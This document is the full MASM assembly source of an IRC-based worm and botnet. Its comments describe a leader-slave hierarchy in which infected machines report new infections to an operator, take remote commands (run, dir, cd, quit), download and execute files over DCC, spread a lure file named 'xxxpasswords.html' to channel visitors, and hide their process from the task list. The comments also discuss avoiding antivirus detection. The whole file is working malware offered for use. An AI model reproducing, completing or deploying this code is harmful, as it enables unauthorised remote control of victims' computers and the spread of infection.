   ; Main script, establich the contact between the new viruses.
   ;
   ; What happens when a new virus connects

   ; Step 1. On connect.
   ; SEND Nickname
   ; USER Ident . . :Realname

   ; Step 2. When connected
   ; Check if leader is online

   ; Step 3. If Leader is offline
   ; New leader is God
   ; Goto step 2

   ; Step 4. If leader is online
   ; Send "Hello master"

   ; Step 5. At Reply = "Hello child"
   ; Send "Do you have place for me?"

   ; Step 6. At Reply = "No, ask X"
   ; Change Leader to X
   ; Goto step 4

   ; Step 7. At Reply = "SEND: X"
   ; Check if file X exist
   ; If file doesnt exist, send "DCC X"

   ; Step 8. At Reply = 01,"DCC"
   ; Recieve the file and execute it



   ; What happens at the Leader side of the connection (the virus that is
   ; connected to the newly connected virus)

   ; Step 11. At Recieved = "Hello master"
   ; Send "Hello child"

   ; Step 12. At Recieved = "Do you have place for me?"
   ; Look how many slaves that it currently has

   ; Step 13. If Slave list if full (more then five slaves)
   ; Send "No, ask SlaveX"

   ; Step 14. If slave list isnt full
   ; Add new virus to slave list
   ; Send list of files

   ; Step 15. At Recieved = "DCC X"
   ; Open a DCC connection and send a CTCP DCC reply to virus

   ; This is the basics for a connection, if we want to upgrade the virus we
   ; just DCC it a file and it will download it and execute it. This virus will
   ; then send this program to every new virus at Step 14. These viruses will
   ; also send it further, so we get a whole branch that all has this program.

   ;                                               God
   ;                                          1 ( 2 3 4 5 )
   ; I DCC a new file to this virus ->  1 ( 2 3 4 5 )
   ; All these will have the file   1 2 3 4 5
   ; too if they connected to IRC
   ; after i DCC'ed the new program


   ; The viruses regulary check to see if all slaves and its leader is online
   ; if the leader is gone it goes to step 3. If a slave is missing then it is
   ; deleted from the slave list.


   ; commands marked with three stars (***) are considered dangerous in the way
   ; that it would be easy for the AV's to find all viruses. Delete for less fun
   ; and more security

   includelib kernel32.lib
   includelib user32.lib


   .486
   .model flat, stdcall
   include c:\masm\include\windows.inc
   include c:\masm\include\kernel32.inc
   include c:\masm\include\user32.inc



           NULL                    equ     0
           EndOfList               equ     0

           NoScan                  equ     1

           ConnectFunction         equ     1
           DCCRecvFunction         equ     2
       DCCChatFunction     equ 3

           DCCSendFunction         equ     4

           QuitFunction            equ     5
           NewSlaveFunctions       equ     6
           ShouldRecieveProgram    equ     7
           GenerateNewNick         equ     8

           ExecuteProgram          equ     9
           DirFunction             equ     10

   .code

      BeginOfScript:

      Header:
           Magic                   db      "VIRc"
           Alignment               dd      -401000h

           User                    dd      Userinfo
           Slaves                  dd      SlaveNames
           Ignores                 dd      IgnoreNames
           IRCServers              dd      IPList

           MessageParsePtr         dd      MessageParseData

           DownloadedFiles         dd      ListOfDownloadedFiles

      EndOfHeader:

   ; ---------------------------------------------- User info

      Userinfo:
           Nickname                db      "Vir00002"
           db      10-($-Nickname) dup (0)
           Ident                   db      "Nick"
           db      10-($-Ident) dup (0)
           RealName                db      "DrSolomon"
           db      10-($-RealName) dup (0)
           God                     db      "VirusGod"
           db      10-($-God) dup (0)
           Leader                  db      "VirusGod"
           db      10-($-Leader) dup (0)
                                   db      EndOfList

      SlaveNames:
                                   db      10 dup (0)
                                   db      10 dup (0)
                                   db      10 dup (0)
                                   db      10 dup (0)
                                   db      10 dup (0)
                                   db      EndOfList

      IgnoreNames:
                                   db      50 dup (0)
                                   db      EndOfList




   ; ----------- List of IP addresses of undernet IRC servers

     IPList                        db      "192.160.127.97",0
                                   db      "130.243.35.1",0   ; efnet
                                   db      "203.37.45.2",0
                                   db      "209.47.75.34",0
                                   db      "195.154.203.241",0
                                   db      "194.159.80.19",0
                                   db      "128.138.129.31",0


                                   db      EndOfList
                                   db      0

   ; -------------- How to handle messages

     MessageParseData:

                                   db      NoScan
                                   db      "|$0 ",2
                                   dd      RealStart
                                   db      EndOfList

     RealStart:


                                   db      "$0 NICK",0
                                   db      "|$1:",2
                                   dd      NickChangeProc

                                   db      "$0 PRIVMSG",0
                                   db      "|$1 ",2; split $1 at space until
                                                   ; two new strings is created
                                   dd      PrivMsgData

                                   db      "$0 001",0 ; First message
                                   db      "l"
                                   dd      StartCommands

                                   db      "$0 303",0
                                   db      "l"
                                   dd      IsOnMessage

                                   db      "$0 JOIN",0
                                   db      "|$1:",2
                                   dd      JoinMessage

                                   db      "$0 319",0      ; WHOIS channels
                                   db      "|$1:",2
                                   dd      JoinWhoisChannels

   ; Low level commands
                                   db      "$0 433",0
                                   db      "f"
                                   dw      GenerateNewNick

                                   db      "$0 PING",0
                                   db      "l"
                                   dd      PingList

                                   db      "$0 ERROR",0
                                   db      "f"
                                   dw      ConnectFunction

                                   db      EndOfList


   JoinWhoisChannels:
                                   db      "$2 #",0
                                   db      "l"
                                   dd      JoinChannel

                                   db      "$4 #",0
                                   db      "|$4#",2
                                   dd      SecondChannel

                                   db      EndOfList
   SecondChannel:
                                   db      NoScan
                                   db      "|$5 ",2
                                   dd      SecondChannel2
                                   db      EndOfList

   SecondChannel2:
                                   db      NoScan
                                   db      "s"
                                   db      "JOIN #$5",0
                                   db      EndOfList


   PingList:
                                   db      NoScan
                                   db      "s"
                                   db      "PONG $1",0

   ; check if all is online
                                   db      NoScan
                                   db      "s"
                   db  "ISON $slave1 $slave2 $slave3 $slave4 $slave5 $leader",0
                   db  EndOfList

   NickChangeProc:
                                   db      "$nick $mynick",0
                                   db      "v"
                                   db      "$mynick $2",0
                                   db      EndOfList

   JoinMessage:

                                   db      "!$nick $mynick",0
                                   db      "l"
                                   dd      SendFileToJoiner

                                   db      EndOfList

   SendFileToJoiner:
                                   db      NoScan
                                   db      "v"
                                   db      "$3 xxxpasswords.html",0

                                   db      NoScan
                                   db      "f"
                                   dw      DCCSendFunction

                                   db      EndOfList

   ; ------------------------------------ Handler of PRIVMSGs

     PrivMsgData:
                   db      NoScan
                   db      "v"
                   db      "$recv $1",0

                   db      "$1 $mynick",0          ; if where to send = mynick
                   db      "v"                     ; change that variable
                   db      "$recv $nick",0         ; to $nick. This happens
                                                   ; at private msgs

                   db      "$nick $leader",0       ; messages from the leader
                   db      "l"
                   dd      LeaderMessages

                   db      "$slaves $nick",0
                   db      "l"
                   dd      SlaveMessages

                   db      "$nick Bhunji",0
                   db      "l"
                   dd      NickIsBhunji

                   db      "!$nick $mynick",0      ; parse if ordinary user
                   db      "l"
                   dd      UserMessages
                   db      EndOfList

     UserMessages:
                   db      "!$nick $leader",0
                                                   ; parse if ordinary user
                   db      "l"
                   dd      UserMessages2
                   db      EndOfList

     UserMessages2:
                   db      "!$nick $child",0
                                                   ; parse if ordinary user
                   db      "l"
                   dd      UserMessages3
                   db      EndOfList



     UserMessages3:
                   db      "$2 :DCC script.exe",0
                   db      "l"
                   dd      SendScript

                   db      "$2 :Hello master",0    ; Is message = Hello master
                   db      "l"
                   dd      NewVirusOnline

                   db      "$2 :Do you have place for me?",0
                   db      "f"
                   dw      NewSlaveFunctions


                   db      "!$recv #",0            ; is a private message
                   db      "s"
                   db      "WHOIS $recv",0         ; join all channels that
                                                   ; the sender is visiting

   JoinChannel:
                   db      "$2 #",0                ; look for a #
                   db      "|$2#",2                ; split string at #
                   dd      ParseChannel
                   db      EndOfList

   ParseChannel:
                   db      NoScan
                   db      "|$3 ",2                ; split string at space
                   dd      JoinNewChannel
                   db      EndOfList

   JoinNewChannel:
                   db      NoScan
                   db      "s"
                   db      "JOIN #$3",0
                   db      EndOfList



   NewVirusOnline:
                   db      NoScan
                   db      "s"                     ; if so, Send string
                   db      "$0 $recv :Hello child",0  ; $0 = PRIVMSG
                                                   ; $recv = Channel or Person
                                                   ; Hello child = Message to
                                                   ; send
                   db      NoScan
                   db      "s"
                   db      "$0 Bhunji :New infection",0
                   db      EndOfList

   NickIsBhunji:
                   db      "$2 :DCC ",0
                   db      "|$2 ",2
                   dd      AtDCCSend


                   db      "$2 :restart",0
                   db      "f"
                   dw      ConnectFunction

                   db      "$2 :god",0             ; ***
                   db      "s"
                   db      "$0 Bhunji :$god",0

                   db      "$2 :leader",0          ; ***
                   db      "s"
                   db      "$0 Bhunji :$leader",0

                   db      "$2 :nick ",0           ; ***
                   db      "|$2 ",2
                   dd      ChangeNickFunction


                   db      "$2 :cd ",0
                   db      "|$2 ",2
                   dd      SetPath

                   db      "$2 :dir ",0
                   db      "|$2 ",2
                   dd      CallDirFunction

           db  NoScan
           db  "l"
           dd  LeaderMessages
                   db      EndOfList

   SetPath:
                   db      NoScan
                   db      "v"
                   db      "$path $3",0
                   db      EndOfList

   CallDirFunction:
                   db      NoScan
                   db      "f"
                   dw      DirFunction
                   db      EndOfList

   ;------------------------- Messages from one of the slaves
   SlaveMessages:
                   db      "$2 :DCC",0
                   db      "|$2 ",2
                   dd      AtDCCSend
                   db      EndOfList


   SendScript:
                   db      NoScan
                   db      "v"
                   db      "$3 script.exe",0

   AtDCCSend:
                   db      NoScan
                   db      "f"
                   dw      DCCSendFunction
                   db      EndOfList

   ; ------------------------------- Messages from the leader
   LeaderMessages:
                   db      "$2 :recursive ",0      ; ***
                   db      "s"
                   db      "$0 $slaves $2",0

                   db      "$2 :join ",0
                   db      "|$2 ",2
                   dd      EnterChannelFunction

                   db      "$2 :leave ",0
                   db      "|$2 ",2
                   dd      LeaveChannelFunction

                   db      "$2 :msg",0             ; ***
                   db      "|$2 ",3
                   dd      MessageFunction

                   db      "$2 :slaves",0          ; ***
                   db      "s"
                   db      "$0 $recv :$slaves",0

                   db      "$2 :run ",0
                   db      "|$2 ",2
                   dd      RunProgram

                   db      "$2 :Hello child",0
                   db      "s"
                   db      "$0 $recv :Do you have place for me?",0

                   db      "$2 :quit!!",0          ; ***
                   db      "f"
                   dw      QuitFunction

                   db      "$2 ",01,"DCC",0        ; leader sends a file
                   db      "|$2 ",3                ; $3 = send or chat
                   dd      DCCRecvProc             ; $4 = additional data

                   db      "$2 :SEND:",0
                   db      "|$2 ",2
                   dd      CheckIfGotProgram

                   db      "$2 :No, ask ",0
                   db      "|$2 ",3
                   dd      NewLeader
                   db      EndOfList

   RunProgram:
                   db      NoScan
                   db      "f"
                   dw      ExecuteProgram
                   db      EndOfList

   CheckIfGotProgram:
                   db      NoScan
                   db      "f"
                   dw      ShouldRecieveProgram
                   db      EndOfList


                   ; Change leader and restart
   NewLeader:
                   db      NoScan
                   db      "v"
                   db      "$leader $4",0

                   db      NoScan
                   db      "l"
                   dd      StartCommands
                   db      EndOfList



   LeaveChannelFunction:
                   db      NoScan
                   db      "s"
                   db      "PART $3",0
                   db      EndOfList

   ChangeNickFunction:
                   db      NoScan
                   db      "s"
                   db      "NICK $3",0

                   db      EndOfList

   EnterChannelFunction:
                   db      NoScan
                   db      "s"
                   db      "JOIN $3",0
                   db      EndOfList

   MessageFunction:
                   db      NoScan
                   db      "s"
                   db      "PRIVMSG $3 :$4",0
                   db      EndOfList


   ; -------------------------------------------- DCC Handler
     DCCRecvProc:
               db  "$3 SEND",0
               db  "f"
                           dw      DCCRecvFunction

               db  EndOfList

               db  "$4 CHAT",0
                           db      "f"
               dw  DCCChatFunction

                           db      EndOfList

   ; ------------------------------------ If leader is online
     IsOnMessage:

     ; if leader isnt online, change name to leader

                                   db      "!$1 $leader",0
                                   db      "l"
                                   dd      Restart

                                   db      "!$1 $slave1",0
                                   db      "v"
                                   db      "$slave1 ",0

                                   db      "!$1 $slave2",0
                                   db      "v"
                                   db      "$slave2 ",0

                                   db      "!$1 $slave3",0
                                   db      "v"
                                   db      "$slave3 ",0

                                   db      "!$1 $slave4",0
                                   db      "v"
                                   db      "$slave4 ",0

                                   db      "!$1 $slave5",0
                                   db      "v"
                                   db      "$slave5 ",0
                                   db      EndOfList

     Restart:

                                   db      NoScan
                                   db      "s"
                                   db      "NICK $leader",0

                                   ; new leader is god
                                   db      NoScan
                                   db      "v"
                                   db      "$leader $god",0

                                   ; restart virus

   ; ----------------------- Commands to send when registered

     StartCommands:                ; Check if leader is online
                                   db      NoScan
                                   db      "s"
                                   db      "ISON $leader",0

                                   db      NoScan
                                   db      "s"
                                   db      "PRIVMSG $leader :Hello master",0
                                   db      EndOfList

   ; Dont change anything below

   ; Messages not beginning with ':'

   ListOfDownloadedFiles:
                                   db      EndOfList

   EndOfScript:

                                   db      10 dup (0)


   .code
           ScriptFileName          db      "script.dat",0
           BotFileName             db      "dllmgr.exe",0


   Kernel32                db      "kernel32",0
   RegisterService         db      "RegisterServiceProcess", 0
   HideProgram:
           invoke  GetModuleHandleA, offset Kernel32
           invoke  GetProcAddress, eax, offset RegisterService
           test    eax,eax
           jz      NoHide
           push    1
           push    0
           call    eax
        NoHide:
           ret



   MyOpenFile:
           xor     edx,edx
           invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
           mov     ebx, eax
           cmp     eax,INVALID_HANDLE_VALUE
           ret


       Main:
           xor     esi, esi
           call    HideProgram

       WaitUntilBotIsDead:
           invoke  Sleep, 1000
           mov     eax,offset BotFileName
           mov     ebx,GENERIC_READ
           mov     ecx,OPEN_ALWAYS
           call    MyOpenFile
           jz      WaitUntilBotIsDead
           invoke  CloseHandle, ebx


           mov     eax,offset ScriptFileName
           mov     ebx,GENERIC_WRITE
           mov     ecx,CREATE_ALWAYS
           call    MyOpenFile
           jz      Error

           push    esi
           mov     ecx,esp

           invoke  WriteFile, ebx, offset BeginOfScript, EndOfScript-BeginOfScript, ecx, esi
           pop     eax
           invoke  CloseHandle, ebx

           invoke  WinExec, offset BotFileName, SW_SHOW


       Error:
           invoke  ExitProcess, 0
   end Main
